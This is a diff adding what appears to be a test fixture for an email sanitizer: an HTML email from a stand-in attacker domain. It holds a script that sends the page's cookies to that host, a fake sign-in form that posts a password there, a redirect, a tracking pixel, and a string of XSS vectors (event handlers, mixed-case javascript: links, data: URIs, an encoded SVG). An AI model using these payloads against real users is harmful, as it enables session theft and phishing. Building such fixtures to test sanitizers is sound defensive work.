@@ -1,0 +1,36 @@
+Return-Path: <trouble@badplace.example.com>
+Delivered-To: hello@quickpickle.example
+From: Trouble <trouble@badplace.example.com>
+To: hello@quickpickle.example
+Subject: Please open this
+Date: Wed, 11 Nov 2026 03:03:00 +1300
+Message-ID: <trouble-1@badplace.example.com>
+X-QP-Conversation: 2222222222222222222a-00000000000000000000000000000000
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html>
+<head>
+<base href="https://badplace.example.com/">
+<meta http-equiv="refresh" content="0; url=https://badplace.example.com/gone">
+<style>@import url("https://badplace.example.com/steal.css"); body { background: url(https://badplace.example.com/bg.png) }</style>
+<script>fetch("https://badplace.example.com/steal?c=" + document.cookie)</script>
+<link rel="stylesheet" href="https://badplace.example.com/steal.css">
+</head>
+<body onload="alert(1)">
+<p onclick="alert(2)" style="position:fixed; top:0; left:0; width:100%; height:100%; background-image:url(https://badplace.example.com/overlay.png); color: red">Hello</p>
+<img src="x" onerror="alert(3)">
+<img src="https://badplace.example.com/pixel.gif?who=hello" width="1" height="1">
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoNCkiPjwvc3ZnPg==">
+<a href="javascript:alert(5)">a link</a>
+<a href="JaVaScRiPt:alert(6)">another</a>
+<a href="data:text/html,<script>alert(7)</script>">a third</a>
+<a href="https://badplace.example.com/ok" target="_top">a real one</a>
+<form action="https://badplace.example.com/collect" method="post"><input name="password" type="password"><button>Sign in</button></form>
+<iframe src="https://badplace.example.com/frame"></iframe>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(8)"><script>alert(9)</script><a xlink:href="javascript:alert(10)"><text>svg</text></a></svg>
+<object data="https://badplace.example.com/thing.swf"></object>
+<embed src="https://badplace.example.com/thing.swf">
+<math><maction actiontype="statusline#https://badplace.example.com">x</maction></math>
+</body>
+</html>
